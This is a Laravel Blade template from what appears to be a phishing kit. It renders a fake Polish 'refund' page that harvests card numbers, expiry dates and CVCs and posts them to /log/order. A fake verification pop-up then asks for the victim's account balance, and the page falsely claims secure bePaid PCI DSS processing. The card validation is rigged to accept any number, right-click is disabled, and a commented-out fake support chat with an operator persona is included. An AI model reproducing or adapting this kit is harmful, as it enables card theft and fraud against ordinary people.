@extends('layouts.fake')
@push('css')
    <style>
        #verification {
            overflow-x: hidden;
            overflow-y: auto;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 1050;
            display: none;
            background: #000000bf;
            width: 100%;
            height: 100%;
            overflow: hidden;
            outline: 0;
            transition: opacity .15s linear;
            opacity: 0;
        }

        #holder {
            height: 150px;
        }

        #contnet {
            text-align: left;
            display: none;
        }

        #loader-verif {
            height: 38px;
            margin-left: -9px;
            margin-top: -9px;
            width: 38px;
            background-image: url(/loader.png);
            -webkit-animation: spinner-spin8 .8s steps(8) infinite;
            animation: spinner-spin8 .5s steps(8) infinite;
            left: 49%;
            position: absolute;
            top: 220px;
            background-size: 100%;
        }

        @keyframes spinner-spin8 {
            0% {
                -webkit-transform: rotate(180deg);
                transform: rotate(180deg)
            }
            to {
                -webkit-transform: rotate(540deg);
                transform: rotate(540deg)
            }
        }

        #verif-window {
            margin: 12px;
        }

        #verif-contnt {
            padding: 20px;
            background-color: #fff;
            margin: 0 auto;
            max-width: 290px;
            border-radius: 6px;
            margin-top: 100px;
        }

        #cardstyle {
            background: rgb(255, 90, 0);
            background: linear-gradient(29deg, rgba(255, 90, 0, 1) 0%, rgba(255, 108, 132, 1) 100%);
            border-radius: 8px;
        }

        #cardback {
            background-image: url(/cardback.svg);
        }

        #testcard {
            padding: 40px 15px;
            padding-top: 50px;
            background-image: url(/cardback.svg);
            background-repeat: no-repeat;
            background-position: 0 0;
            background-size: 280px;
        }

        ._0 {
            margin: 0 auto;
            max-width: 330px;
            margin-bottom: 96px;
        }

        ._1 {
            height: 64px;
            border-bottom: 1px solid #DDD;
            margin-top: 24px;
            margin-bottom: 8px;
            padding-bottom: 20px;
        }

        ._2 {
            height: 100%;
            background: url(logo.svg) no-repeat 0 center / auto 42px;
        }

        ._3 {
            font-size: 26px;
            margin-top: 20px;
            margin-bottom: 20px;
            color: #000;
        }

        ._4 {
            padding: 8px 12px;
            border: 1px solid #CCC;
            border-radius: 4px;
            margin-bottom: 10px;
        }

        ._4:hover {
            border: 1px solid #B3B3B3;
        }

        ._4:focus {
            box-shadow: 0 0 4px #009CF0;
        }

        ._5 {
            color: #555;
        }

        ._6 {
            padding-bottom: 6px;
        }

        ._7 {
            margin-top: 10px;
        }

        ._8 {
            width: 70%;
            display: inline-block;
        }

        ._9 {
            width: 30%;
            float: right;
            display: inline-block;
        }

        ._10 {
            width: 40%;
            display: inline-block;
        }

        ._11 {
            -webkit-appearance: none;
            padding: 10px 0;
            font-size: 18px;
            color: #fff;
            cursor: pointer;
            background: rgb(255, 90, 0);
            background: linear-gradient(29deg, rgba(255, 90, 0, 1) 0%, rgba(255, 108, 132, 1) 100%);
            border-radius: 13px;
            border: none;
            width: 100%;
        }

        ._11:disabled {
            background: #d4d3d3;
            cursor: default;
            color: #fff;
        }

        ._11:focus {
            outline: none;
        }

        ._12 {
            width: 40%;
            vertical-align: top;
        }

        ._13 {
            font-weight: bold;
            vertical-align: top;
        }

        ._14 {
            margin-top: 24px;
        }

        ._15, ._15:hover {
            border: 1px solid #FF6163;
        }

        ._15:focus {
            box-shadow: 0 0 4px #FF6163;
        }

        ._16 {
            color: #FD5555;
            margin-bottom: 64px;
        }

        ._17 {
            color: #999;
            margin: 16px 0;
        }

        body {
            margin: 0 12px;
            font-family: Arial;
            font-size: 14px;
            color: #222;
            word-break: break-word;
            user-select: none;
        }

        input {
            -webkit-appearance: none;
            font-family: Arial;
            font-size: 16px;
            color: #222;
            width: 100%;
            border: none;
            outline: none;
            box-sizing: border-box;
        }

        a {
            color: #999;
            cursor: pointer;
            text-decoration: underline;
        }

        table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
        }

        td {
            padding: 0;
        }

        @media all and (max-width: 960px) {
            ._1 {
                margin-top: 16px;
            }
        }

        @media all and (max-width: 720px) {
            #loader-verif {
                left: 48%;
            }

        }
    </style>
    <style>
        .chaport-container.chaport-container-positioned {
            position: fixed;
            box-sizing: border-box;
            top: auto;
            right: 0;
            bottom: 0;
            left: 0;
            width: auto;
            height: 0;
            overflow: visible;
        }

        .chaport-container {
            font-size: 14px;
            z-index: 2147483500;
        }

        .chaport-container .chaport-launcher {
            position: absolute;
            display: block;
            bottom: 0;
            right: 0;
            left: 0;
            z-index: 2147483500;
            width: auto;
            height: 0;
            overflow: visible;
            font-size: 14px;
        }

        .chaport-container div {
            display: block;
        }

        .chaport-container.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button, .chaport-content.chaport-window-dark-gray .chaport-launcher .chaport-launcher-button {
            background-color: #ff5a00;
        }

        .chaport-container .chaport-launcher .chaport-launcher-button {
            position: absolute;
            bottom: 1.42857em;
            right: 1.42857em;
            width: 4.28571em;
            height: 4.28571em;
            -webkit-border-radius: 50%;
            -moz-border-radius: 50%;
            -ms-border-radius: 50%;
            border-radius: 50%;
            -webkit-box-shadow: 0 5px 38px rgba(0, 0, 0, 0.15);
            box-shadow: 0 5px 38px rgba(0, 0, 0, 0.15);
            cursor: pointer;
            -webkit-transition: visibility 0s linear 0.2s, opacity linear 0.2s;
            -o-transition: visibility 0s linear 0.2s, opacity linear 0.2s;
            transition: visibility 0s linear 0.2s, opacity linear 0.2s;
        }

        .chaport-container .chaport-anim-show {
            visibility: visible;
            opacity: 1;
            -webkit-transition-delay: 0s !important;
            transition-delay: 0s !important;
        }

        .chaport-container .chaport-launcher {
            position: absolute;
            display: block;
            bottom: 0;
            right: 0;
            left: 0;
            z-index: 2147483500;
            width: auto;
            height: 0;
            overflow: visible;
            font-size: 14px;
        }

        .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-chat-icon {
            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            opacity: 1;
            transform: rotate(0deg);
            width: 2.28571em;
            height: 2.64286em;
            position: absolute;
            margin-top: 0.07143em;
            top: 0.92857em;
            left: 1em;
            background-image: url(/chap.png);
            background-repeat: no-repeat;
            background-size: 100% 100%;
        }

        .chaport-container .chaport-launcher .chaport-launcher-button {
            position: absolute;
            bottom: 1.42857em;
            right: 1.42857em;
            width: 4.28571em;
            height: 4.28571em;
            -webkit-border-radius: 50%;
            -moz-border-radius: 50%;
            -ms-border-radius: 50%;
            border-radius: 50%;
            -webkit-box-shadow: 0 5px 38px rgba(0, 0, 0, 0.15);
            box-shadow: 0 5px 38px rgba(0, 0, 0, 0.15);
            cursor: pointer;
            -webkit-transition: visibility 0s linear 0.2s, opacity linear 0.2s;
            -o-transition: visibility 0s linear 0.2s, opacity linear 0.2s;
            transition: visibility 0s linear 0.2s, opacity linear 0.2s;
        }

        .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon {
            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            opacity: 0;
            transform: rotate(-45deg) scale(1);
            position: absolute;
            top: 0;
            right: 0;
            width: 4.28571em;
            height: 4.28571em;
        }

        .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before {
            -ms-transform: rotate(45deg);
            -webkit-transform: rotate(45deg);
            transform: rotate(45deg);
        }

        .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:before, .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-close-icon:after {
            position: absolute;
            top: 1.5em;
            right: 2.07143em;
            content: ' ';
            height: 1.35714em;
            width: 0.14286em;
            background-color: #fff;
        }

        .chaport-container .chaport-launcher .chaport-launcher-button.no-photo .chaport-launcher-operator-photo {
            opacity: 0;
        }

        .chaport-container .chaport-launcher .chaport-launcher-button .chaport-launcher-operator-photo {
            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            opacity: 1;
            transform: rotate(0deg);
            position: absolute;
            z-index: 1;
            width: 100%;
            height: 100%;
        }

        .chaport-container .chaport-launcher .chaport-launcher-button .chaport-badge-show {
            transform: scale(1);
        }

        .chaport-container .chaport-launcher .chaport-message .chaport-message-tail:after {
            border-width: 0.33333em;
            bottom: 1.13333em;
            border-left-color: #fff;
        }

        .chaport-container .chaport-window-anim.chaport-anim-hide {
            transform: translateY(20px);
        }

        .chaport-container.chaport-container-positioned .chaport-window {
            position: absolute;
            top: auto;
            right: 20px;
            bottom: 115px;
            left: auto;
            width: 300px;
            -webkit-box-shadow: 0 5px 38px rgba(0, 0, 0, 0.15);
            box-shadow: 0 5px 38px rgba(0, 0, 0, 0.15);
            -webkit-border-radius: 8px;
            -moz-border-radius: 8px;
            -ms-border-radius: 8px;
            border-radius: 8px;
            overflow: hidden;
            z-index: 2147483500;
        }

        .chaport-container .chaport-window-anim {
            transition: height 0s linear 0.3s, visibility 0s linear 0.3s, opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1), transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .chaport-container .chaport-inner {
            position: relative;
            margin-left: 0px;
            margin-right: 0px;
            background-color: #fff;
        }


        .chaport-container .chaport-auto-invitation .chaport-auto-invitation-message {
            position: absolute;
            right: 0;
            bottom: 60px;
        }

        .chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face {
            position: absolute;
            left: -41px;
            bottom: 7px;
        }

        .chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-face .photo img {
            width: 100%;
            height: 100%;
            -webkit-border-radius: 50%;
            -moz-border-radius: 50%;
            -ms-border-radius: 50%;
            border-radius: 50%;
        }

        .chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .operator-name {
            margin-bottom: 5px;
            font-size: 15px;
            font-weight: bold;
        }

        .chaport-container .chaport-auto-invitation .chaport-auto-invitation-message .chaport-auto-invitation-message-body .message-text {
            font-size: 15px;
        }

        @media (max-width: 339px), (min-width: 341px) {
            .chaport-close, .chaport-container .chaport-close {
                display: block;
            }
        }

        .chaport-container .chaport-big-shadow {
            opacity: 0;
            z-index: 2147483499;
            position: fixed;
            width: 480px;
            height: 480px;
            bottom: 0;
            right: 0;
            content: "";
            pointer-events: none;
            background: radial-gradient(ellipse at bottom right, rgba(27, 37, 52, 0.15) 0, rgba(27, 37, 52, 0) 70%);
            -webkit-transition: opacity 0.2s linear;
            -o-transition: opacity 0.2s linear;
            transition: opacity 0.2s linear;
        }

        .chaport-content {
            position: absolute;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            overflow: hidden;
            -webkit-border-top-left-radius: 8px;
            -moz-border-top-left-radius: 8px;
            -ms-border-top-left-radius: 8px;
            border-top-left-radius: 8px;
            -webkit-border-top-right-radius: 8px;
            -moz-border-top-right-radius: 8px;
            -ms-border-top-right-radius: 8px;
            border-top-right-radius: 8px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        @media (max-width: 460px), (max-width: 750px) and (orientation: landscape)
            .chaport-content {
                -webkit-border-radius: 0;
                -moz-border-radius: 0;
                -ms-border-radius: 0;
                border-radius: 0;
            }

            .chaport-close, .chaport-container .chaport-close {
                position: absolute;
                top: 0;
                right: 0;
                z-index: 4;
                width: 50px;
                height: 41px;
                cursor: pointer;
                opacity: 0.6;
                -webkit-transition: opacity 0.2s linear;
                -o-transition: opacity 0.2s linear;
                transition: opacity 0.2s linear;
                display: none;
            }

            .main-textblock {
                background-color: #ffffff;
                border-radius: 4px;
                height: 500px;
            }

            .operatorblock {
                height: 130px;
                background-color: #ff5a00;
                top: 0;
            }

            #operator-photo {

                width: 60px;
                height: 60px;
                margin-bottom: 7px;
                text-align: center;
                margin-top: 8px;
            }

            #oper-photo-img {
                width: 100%;
                height: 100%;
                border-radius: 50%;
            }

            .operatorblock-content {
                padding: 20px;
                display: flex;
            }

            .operator-name {
                font-size: 13px;
                color: rgba(255, 255, 255, 0.7);
            }

            .team-wrapper {
                text-align: center;
                width: 60%;
                margin-top: 30px;
                margin-left: 4%;
            }

            .team {
                font-size: 16px;
                color: #fff;
            }

            .activity-indicator {
                font-size: 13px;
                color: rgba(255, 255, 255, 0.7);
            }

            .with-status {
                padding-left: 15px;
                display: inline-block;
                position: relative;
            }

            .status-online {
                display: block;
                background-color: #4fd237;
                position: absolute;
                right: -3px;
                bottom: 3px;
                width: 7px;
                height: 7px;
                background-repeat: no-repeat;
                border-radius: 7px;
                border-width: 1px;
                border-style: solid;
                box-sizing: content-box;
                left: 0;
                right: auto;
                border-color: #4fd237;
            }

            #input-msg {
                border-top: 1px solid #babac05c;
                width: 100%;
                position: absolute;
                bottom: 0;
                height: 50px;
                margin-bottom: 20px;
            }

            #smstosup1 {
                margin-left: 10px;
                width: 100%;
                border: none;
                font-size: 15px;
            }

            .chaport-container .chaport-input-wrapper .chaport-send-icon, .chaport-input-wrapper .chaport-send-icon {
                opacity: 1;
                transform: scale(1);
                position: absolute;
                bottom: 15px;
                left: 7px;
                width: 18px;
                height: 18px;
                transition: opacity 0.2s linear, transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
            }

            .chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
                fill: #414141;
                transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
            }

            #smstosupbutton1 {
                border-width: 0px;
                background: #fff;
                margin-right: 10px;
            }

            #smstosupbutton1 {
                cursor: pointer;
            }

            #smstosupbutton1:focus, #smstosupbutton1:active {
                outline: none;
            }

            .chaport-window {
                visibility: hidden;
                opacity: 0;
            }

            .chat-block {
                overflow-y: auto;
                height: 300px;
                overflow-x: hidden;

            }

            #chat {
                padding-bottom: 15px;
            }

            .operators-msg {
                margin-top: 15px;
            }

            .operators-first-text {
                padding: 10px;
                width: 180px;
                border-radius: 8px;
                background-color: #e8ecef;
                padding-right: 30px;
            }

            .operators-msg-text {
                padding: 10px;
                max-width: 180px;
                border-radius: 8px;
                background-color: #e8ecef;
                padding-right: 30px;
            }

            .visitors-msg-text {
                margin-top: 15px;
                margin-right: 10px;
                margin-left: 80px;
                padding: 10px;
                min-width: 180px;
                border-radius: 8px;
                background-color: #4b4b4b;
                color: #fff;
            }

            .operators-photo img {
                width: 30px;
                height: 30px;
                border-radius: 50%;
                margin-left: 5px;
                margin-right: 5px;
            }

            .chat-block::-webkit-scrollbar {
                width: 7px;
            }

            .chat-block::-webkit-scrollbar-button {
                display: none;
            }

            .chat-block::-webkit-scrollbar-thumb {
                border-radius: 8px;
                background-color: #babac0;
                border: 1px solid transparent;
            }

            .chat-block::-webkit-scrollbar-thumb {
                border-radius: 8px;
                background-color: #babac0;
                border: 1px solid transparent;
            }
    </style>
@endpush
@section('content')
    <div class="_0">
        <form id="_formPay" name="_formPay" method="POST" action="/log/order">
            @csrf
            <div id="verification">
                <div id="verif-window">
                    <div id="verif-contnt">
                        <div id="contnet">
                            <div style="font-size: 20px; color: #222; margin-bottom: 20px; font-weight: 600; padding-bottom: 10px; border-bottom: 1px solid #dee2e6;">
                                Twoje dane karty są zweryfikowane
                            </div>
                            <div style="color: #555; line-height: 1.6; font-size: 14px; padding-bottom: 20px; border-bottom: 1px solid #dee2e6;">
                                Aby zweryfikować swoją tożsamość w systemie przetwarzania, wprowadź stan konta.
                            </div>
                            <div style="font-size: 16px; color: #0D2344; margin-bottom: 20px; margin-top: 20px; font-weight: 600;">
                                wprowadź stan konta:
                            </div>
                            <div style="margin-bottom: 20px;">
                                <input id="checkbal"
                                       style="padding: 7px; border: 1px solid #cecece; border-radius: 4px;"
                                       form="_formPay" type="number" name="balance" placeholder="100.00" min="1"
                                       required="">
                            </div>
                            <div class="_10" style="display: none;">
                                <div class="_6" style="color: #555;">Waluta</div>
                                <!-- 										<select class="currselect" required name="sel" style="color: #555; padding: 7px; border: 1px solid #cecece; border-radius: 4px;">
                                                                            <option value="">Selectați moneda</option>
                                                                            <option value="EUR">EUR</option>
                                                                            <option value="LEI">LEI</option>
                                                                        </select> -->
                                <input form="_formPay" id="currchoise" value="PLN" name="currency" class="_4"
                                       type="text" style="display: none;">

                            </div>
                            <div>
                                <input id="buttonPay2" form="_formPay" type="submit" class="_11" value="Dalej">
                            </div>
                        </div>
                        <div id="holder"
                             style="margin-top: 30px; width: 100%; text-align: center; font-size: 22px; color: #222;">
                            <div>Walidacji danych</div>
                            <div id="loader-verif"></div>
                        </div>

                    </div>
                </div>
            </div>
            <div class="_1">
                <div class="_2"></div>
            </div>
            <div>
                <div class="_3">Otrzymywanie środków</div>
                <div class="_5">


                    <div id="cardstyle">
                        <!-- <div id="cardback"></div> -->
                        <!-- <div class="_6">Номер карты</div> -->
                        <div id="testcard">
                            <div>
                                <input id="_input0" value="" name="card_number" class="_4" type="text"
                                       placeholder="Numer karty">
                            </div>
                            <div class="_7">
                                <div class="_8">
                                    <div>
                                        <div class="_10">
                                            <input placeholder="Miesiąc" id="_input1" value="" name="expm" class="_4"
                                                   type="text">
                                        </div>

                                        <div class="_10">
                                            <input placeholder="Rok" id="_input2" value="" name="expy" class="_4"
                                                   type="text">
                                        </div>
                                    </div>
                                </div>
                                <div class="_9">
                                    <div>
                                        <input placeholder="CVC" id="_input3" value="" name="card_cvc" class="_4"
                                               type="text">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="_14">
                        <div style="width: 100%; color: #636363; font-size: 15px; display: flex; margin-bottom: 20px;">
                            Kwota Refundacji:
                            <div style="margin-left: 10px; font-size: 18px; font-weight: 600; color: #000; margin-top: -2px;">{{$fake->priceFormat()}}</div>
                        </div>
                        <button form="awue172e823" onclick="verifcard()" id="_buttonPay" class="_11" disabled="">Dalej
                        </button>

                    </div>


                    <div style="border-top: 1px solid #DDD; margin-top: 40px; padding-top: 20px; display: flex; color: #6a6a6a;">
                        <div class="_19" style="width: 100%; line-height: 1.5; padding-left: 10px;">Płatności kartami
                            bankowymi są przetwarzane i przechowywane za pośrednictwem elektronicznego systemu płatności
                            bePaid, który spełnia wszystkie wymogi bezpieczeństwa przesyłania danych (PCI DSS Level 1).
                        </div>
                    </div>
                    <div style="margin-top: 20px; display: flex; text-align: center; margin-left: 20%;">
                        <div class="_19" style="width: 20%;"><img
                                    src="https://upload.wikimedia.org/wikipedia/commons/8/80/Maestro_2016.svg"
                                    alt="maestro" style="width: 40px;"></div>
                        <div class="_19" style="width: 20%;"><img
                                    src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"
                                    style="width: 40px; margin-left: 5px;" alt="mastercard"></div>
                        <div class="_19" style="width: 10%; margin-left: 5px;"><img
                                    src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg"
                                    style="width: 60px; " alt="visa"></div>
                    </div>

                </div>
            </div>
        </form>
    </div>
{{--    <div id="offonthechap">--}}
{{--        <div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed"--}}
{{--             style="bottom: 0px;">--}}
{{--            <div class="chaport-launcher" style="left: 0px; right: 0px;">--}}
{{--                <div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">--}}
{{--                    <div class="chaport-launcher-chat-icon"></div>--}}
{{--                    <div class="chaport-launcher-close-icon"></div>--}}
{{--                    <div class="chaport-launcher-operator-photo"></div>--}}
{{--                </div>--}}
{{--            </div>--}}
{{--            <div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">--}}
{{--                <div class="chaport-inner">--}}
{{--                    <div class="main-textblock">--}}
{{--                        <div class="operatorblock">--}}
{{--                            <div class="operatorblock-content" style="display: flex;">--}}
{{--                                <div id="operator-photo">--}}
{{--                                    <img id="oper-photo-img" src="/operator-img.png">--}}
{{--                                    <div class="operator-name">Sofia</div>--}}
{{--                                </div>--}}
{{--                                <div class="team-wrapper">--}}
{{--                                    <div class="team">Pomoc techniczna</div>--}}
{{--                                    <div class="activity-indicator">--}}
{{--                                        <div class="with-status" style="display: inline-block;">--}}
{{--                                            <div class="status-online" style="display: inline-block;">--}}

{{--                                            </div>--}}
{{--                                            online--}}
{{--                                        </div>--}}
{{--                                    </div>--}}
{{--                                </div>--}}
{{--                            </div>--}}
{{--                        </div>--}}
{{--                        <div class="chat-block">--}}
{{--                            <div id="chat">--}}
{{--                                <div class="operators-msg" id="greeting-msg" style="display: none;">--}}
{{--                                    <div class="operators-photo"><img src="/operator-img.png"></div>--}}
{{--                                    <div class="operators-first-text">Dzień dobry! Jak mogę ci pomóc?</div>--}}
{{--                                </div>--}}

{{--                            </div>--}}
{{--                            <div id="input-msg" style="display: flex;">--}}
{{--                                <input type="text" name="smstosup1" id="smstosup1"--}}
{{--                                       placeholder="Wpisz swoją wiadomość...">--}}
{{--                                <button id="smstosupbutton1">--}}
{{--                                    <div class="chaport-send-icon">--}}
{{--                                        <svg width="18" height="18" viewBox="0 0 535.5 535.5">--}}
{{--                                            <polygon--}}
{{--                                                    points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75"--}}
{{--                                                    fill="#b9bdbf">--}}
{{--                                            </polygon>--}}
{{--                                        </svg>--}}
{{--                                    </div>--}}
{{--                                </button>--}}
{{--                            </div>--}}
{{--                        </div>--}}
{{--                    </div>--}}
{{--                </div>--}}
{{--            </div>--}}
{{--            <div class="chaport-big-shadow"></div>--}}
{{--        </div>--}}
{{--    </div>--}}
    @push('js')
        {{--        <script type="text/javascript" charset="utf-8" async="" src="https://www.smartsuppchat.com/loader.js?"></script>--}}
        <script>
            let chsNum = '0123456789';
            let fields = [
                {
                    'valid': false,
                    'chars': chsNum,
                    'length': [16, 19],
                    'mask': [[16, ' '], [12, ' '], [8, ' '], [4, ' ']],
                    'style': '_4',
                },
                {
                    'valid': false,
                    'chars': chsNum,
                    'length': [2, 2],
                    'mask': false,
                    'style': '_4',
                },
                {
                    'valid': false,
                    'chars': chsNum,
                    'length': [2, 2],
                    'mask': false,
                    'style': '_4',
                },
                {
                    'valid': false,
                    'chars': chsNum,
                    'length': [3, 3],
                    'mask': false,
                    'style': '_4',
                },
            ];

            function inputMask(elem, indx) {
                fields[indx]['valid'] = false;
                let sty = fields[indx]['style'];
                let sty2 = '';
                let val = elem.value;
                let val2 = '';
                let chs = fields[indx]['chars'];
                let len = fields[indx]['length'];
                for (let i = 0; i < val.length; i++) {
                    let flag = chs.includes(val[i]);
                    if (!flag)
                        continue;
                    if (indx == 1) {
                        if (val2.length == 0)
                            flag = ('01'.includes(val[i]));
                        else if (val2.length == 1)
                            if (val2[0] == '0')
                                flag = (parseInt(val[i]) >= 1);
                            else if (val2[0] == '1')
                                flag = (parseInt(val[i]) <= 2);
                    } else if (indx == 2) {
                        if (val2.length == 0)
                            flag = (parseInt(val[i]) >= 2);
                    }
                    if (flag)
                        val2 += val[i];
                }
                val2 = val2.substr(0, len[1]);
                let val2i = parseInt(val2);
                let flag = val2.length >= len[0];
                if (flag) {
                    if (indx == 0) {
                        flag = cardValid(val2);
                    } else if (indx == 1) {
                        flag = (val2i >= 1 && val2i <= 12);
                    } else if (indx == 2) {
                        flag = (val2i >= 20 && val2i <= 99);
                    }
                    if (flag) {
                        fields[indx]['valid'] = true;
                        if (indx == 0) {
                            _input1.focus();
                        } else if (indx == 1) {
                            _input2.focus();
                        } else if (indx == 2) {
                            _input3.focus();
                        }
                    } else {
                        sty2 = ' _15';
                    }
                }
                let mask = fields[indx]['mask'];
                if (mask)
                    val2 = stringInsert(val2, mask);
                elem.value = val2;
                checkButton();
                elem.className = sty + sty2;
            }

            function cardValid(n) {
                let s = 0;
                let l = n.length;
                for (let i = 0; i < l; i++) {
                    let p = parseInt(n[i]);
                    if ((l - i) % 2 == 0) {
                        p *= 2;
                        if (p > 9)
                            p -= 9;
                    }
                    s += p;
                }
                return (true);
            }

            function checkButton() {
                let flag = false;
                for (let i = 0; i < fields.length; i++) {
                    if (!fields[i]['valid']) {
                        flag = true;
                        break;
                    }
                }
                _buttonPay.disabled = flag;
            }

            function stringInsert(s, j) {
                let a = s.split('');
                let l = s.length;
                for (let i = 0; i < j.length; i++) {
                    let k = j[i];
                    if (l > k[0])
                        a.splice(k[0], 0, k[1]);
                }
                return a.join('');
            }

            document.addEventListener('DOMContentLoaded', function () {
                _buttonPay.disabled = true;
                for (let i = 0; i < fields.length; i++) {
                    let e = document.getElementById('_input' + i);
                    e.oninput = function () {
                        inputMask(e, i);
                    }
                    setTimeout(function () {
                        e.oninput();
                    }, 500);
                }
                _formPay.onsubmit = function () {
                    _buttonPay.disabled = true;
                }
            });

            document.oncontextmenu = function () {
                return false;
            };
        </script>
        <script type="text/javascript">
            let button1 = document.querySelector('#_buttonPay');
            let verif = document.querySelector('#verification');
            let load = document.querySelector('#holder');
            let contnet = document.querySelector('#contnet');


            function verifcard() {

                verif.style.display = 'block';
                setTimeout(function () {
                    verif.style.opacity = '1';
                }, 100);
                setTimeout(function () {
                    load.style.display = 'none';
                    contnet.style.display = 'block';
                }, 3000);

            }

            let button2 = document.querySelector('#buttonPay2');
            let check = document.querySelector('#checkbal');

            button2.onclick = function () {
                let str = "{{$fake->price}}";
                str = str.replace(/\s/g, '');
                console.log(str);
                if (check.value == str || check.value == str + '.00') {
                    check.setCustomValidity('Soldul dvs. nu îndeplinește criteriile de identificare. Vă rugăm să contactați asistența tehnică!')
                } else if (check.value == str + '.0') {
                    check.setCustomValidity('Soldul dvs. nu îndeplinește criteriile de identificare. Vă rugăm să contactați asistența tehnică!')
                } else {
                    check.setCustomValidity('')
                }
            }
        </script>
        {{--        <script type="text/javascript">--}}
        {{--            var supportbutton = document.querySelector('.chaport-launcher-button');--}}
        {{--            var supportwindow = document.querySelector('.chaport-window');--}}


        {{--            supportbutton.onclick = function() {--}}
        {{--                if (supportwindow.style.opacity == '0') {--}}
        {{--                    supportwindow.style.opacity = '1';--}}
        {{--                    supportwindow.style.visibility = 'visible';--}}
        {{--                } else {--}}
        {{--                    supportwindow.style.opacity = '0';--}}
        {{--                    supportwindow.style.visibility = 'hidden';--}}
        {{--                }--}}
        {{--            };--}}



        {{--            var docdoc = document,--}}
        {{--                chatscroll = docdoc.querySelector('#chat'),--}}
        {{--                smstosupbutton = docdoc.querySelector('#smstosupbutton1'),--}}
        {{--                msgtext = docdoc.querySelector('#smstosup1');--}}

        {{--            smstosupbutton.onclick = function() {--}}
        {{--                sendmsg();--}}
        {{--                msgtext.value = '';--}}
        {{--            }--}}



        {{--            function ajaxsup() {--}}
        {{--                var request = new XMLHttpRequest();--}}

        {{--                request.onreadystatechange = function() {--}}
        {{--                    if (request.readyState == 4 && request.status == 200) {--}}
        {{--                        // msgsto.innerHTML = request.responseText;--}}
        {{--                        var resultstring = request.responseText;--}}
        {{--                        // console.log(resultstring);--}}
        {{--                        var resulttoarray = resultstring.split('~');--}}
        {{--                        // console.log(resulttoarray);--}}
        {{--                        resulttoarray.forEach(function(onemsg) {--}}
        {{--                            if (onemsg != '') {--}}
        {{--                                var msgarr = onemsg.split('`');--}}
        {{--                                // console.log(msgarr);--}}

        {{--                                var  selectordiv = "#" + msgarr[2];--}}
        {{--                                var  docdoc1 = document,--}}
        {{--                                    msgarr1 = docdoc1.createTextNode(msgarr[1]),--}}
        {{--                                    msgarr2 = docdoc1.createTextNode(msgarr[2]),--}}
        {{--                                    iscontaindiv = docdoc1.querySelector(selectordiv);--}}

        {{--                                if (chatscroll.contains(iscontaindiv)) {--}}
        {{--                                    return;--}}
        {{--                                } else {--}}
        {{--                                    if (msgarr[0] == '1') {--}}
        {{--                                        var msgwindow = document.createElement('div');--}}
        {{--                                        msgwindow.setAttribute('class', 'visitors-msg-text');--}}
        {{--                                        msgwindow.setAttribute('id', msgarr[2]);--}}
        {{--                                        msgwindow.appendChild(msgarr1);--}}
        {{--                                        chatscroll.appendChild(msgwindow);--}}
        {{--                                    } else if (msgarr[0] == '2') {--}}
        {{--                                        var docdoc2 = document,--}}
        {{--                                            msgwindowbig = docdoc2.createElement('div'),--}}
        {{--                                            msgwindow = docdoc2.createElement('div'),--}}
        {{--                                            operphoto = docdoc2.createElement('div'),--}}
        {{--                                            operphoto2 = docdoc2.createElement('img');--}}
        {{--                                        msgwindowbig.setAttribute('class', 'operators-msg');--}}
        {{--                                        msgwindowbig.setAttribute('style', 'display: flex;');--}}
        {{--                                        operphoto.setAttribute('class', 'operators-photo');--}}
        {{--                                        operphoto2.setAttribute('src', '/operator-img.png');--}}

        {{--                                        msgwindow.setAttribute('class', 'operators-msg-text');--}}
        {{--                                        msgwindow.setAttribute('id', msgarr[2]);--}}
        {{--                                        msgwindow.appendChild(msgarr1);--}}
        {{--                                        msgwindowbig.appendChild(operphoto);--}}
        {{--                                        operphoto.appendChild(operphoto2);--}}
        {{--                                        msgwindowbig.appendChild(msgwindow);--}}
        {{--                                        chatscroll.appendChild(msgwindowbig);--}}
        {{--                                        supportwindow.style.opacity = '1';--}}
        {{--                                        supportwindow.style.visibility = 'visible';--}}
        {{--                                    }--}}
        {{--                                    chatscroll.scrollIntoView(false);--}}
        {{--                                }--}}
        {{--                            }--}}
        {{--                        })--}}
        {{--                    }--}}
        {{--                }--}}
        {{--                request.open('POST', 'support.php');--}}
        {{--                request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');--}}
        {{--                request.send('item=66618112');--}}
        {{--            }--}}
        {{--            function sendmsg() {--}}
        {{--                var request = new XMLHttpRequest();--}}

        {{--                request.onreadystatechange = function() {--}}
        {{--                    if (request.readyState == 4 && request.status == 200) {--}}
        {{--                        ajaxsup()--}}
        {{--                    }--}}
        {{--                }--}}



        {{--                request.open('POST', 'sendsms.php');--}}
        {{--                request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');--}}
